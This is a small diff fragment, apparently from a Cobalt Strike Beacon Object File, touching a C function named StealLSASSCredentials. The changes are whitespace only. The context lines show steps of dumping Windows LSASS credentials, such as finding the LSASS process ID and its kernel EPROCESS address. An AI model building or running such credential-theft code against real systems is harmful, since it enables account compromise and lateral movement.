@@ -151,7 +151,7 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion)
         return FALSE;
     }
     BeaconFormatPrintf(&outputbuffer, "[+] Lsass PID: %d\n", LsassPID);
-
+    
     // Get LSASS EPROCESS address
     DWORD64 ntEprocessVA = GetNtEprocessAddress(hFile);
     DWORD64 LsassEprocessVA = GetTargetEProcessAddress(hFile, LsassPID, ntEprocessVA);
@@ -160,7 +160,6 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion)
 
         
     DWORD lower32bits = (DWORD)LsassEprocessVA;
-    
 
     // Retrieve & Display Credential Data
     BeaconFormatPrintf(&outputbuffer, "\n===== [ Credential Data ] =====\n");
